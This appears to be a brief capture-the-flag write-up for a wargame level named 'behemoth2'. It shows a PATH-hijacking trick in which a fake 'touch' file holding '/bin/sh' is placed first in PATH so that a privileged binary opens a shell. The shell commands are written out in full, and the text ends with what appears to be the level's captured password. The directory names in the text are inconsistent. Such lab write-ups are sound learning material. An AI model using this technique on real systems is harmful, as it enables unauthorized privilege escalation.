first we make a file named "touch", and write "/bin/sh" to give us shell
then we change the PATH env-var to our directory (/tmp/bt2) and add: 
	/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
so we have access to all the commands (the bash looks for a program to run in
each directory, so if /tmp/bt2 is the first, we have overriden touch as we
know to /tmp/bt/touch)
```sh
echo "/bin/sh" > /tmp/dor/touch
export PATH=/tmp/dor:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
./behemoth2
```

and we have shell

nieteidiel


